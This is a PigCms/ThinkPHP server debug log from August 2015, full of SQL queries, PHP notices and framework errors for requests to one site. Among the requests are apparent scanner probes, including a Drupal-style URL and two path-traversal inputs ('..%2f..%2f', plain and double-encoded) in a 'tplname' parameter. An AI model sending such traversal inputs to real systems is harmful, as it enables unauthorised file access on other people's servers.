+[ 2015-08-22T22:27:53+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.046875s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000976s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047851s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080078s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081054s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.081054s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.082031s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
+[ 2015-08-22T22:27:57+08:00 ] ERR: (ThinkException) 无法加载模块:module
+[ 2015-08-22T22:28:11+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.042968s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032226s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.076171s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.076171s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077148s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.078125s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001954s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.078125s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:30:01+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077149s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.078125s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.078125s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.079102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002929s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.080078s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000000s ]
+
+[ 2015-08-22T22:30:03+08:00 ] ERR: (ThinkException) 非法操作:down
+[ 2015-08-22T22:30:09+08:00 ] ERR: (ThinkException) 无法加载模块:search
+[ 2015-08-22T22:30:10+08:00 ] 120.26.74.207 /index.php?admin_dir=admin&site=default&ishtml=1
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.001954s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001954s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.045899s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.033203s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.079102s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.080078s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.081055s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.082031s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003906s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.083008s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
+[ 2015-08-22T22:30:18+08:00 ] 121.42.0.38 /?q=node&destination=node
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.001953s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.045898s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047851s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.034180s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.082031s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.083984s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.084961s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084961s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003906s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.086914s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001953s ]
+
+[ 2015-08-22T22:30:23+08:00 ] 121.42.0.38 /index.php?tplname=..%2f..%2fdynamic%2fstats%2faclicks.cac
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077149s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.077149s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.078125s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.079102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.079102s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:30:25+08:00 ] 121.42.0.38 /index.php?tplname=..%252f..%252fdynamic%252fstats%252faclicks.cac
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000000s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
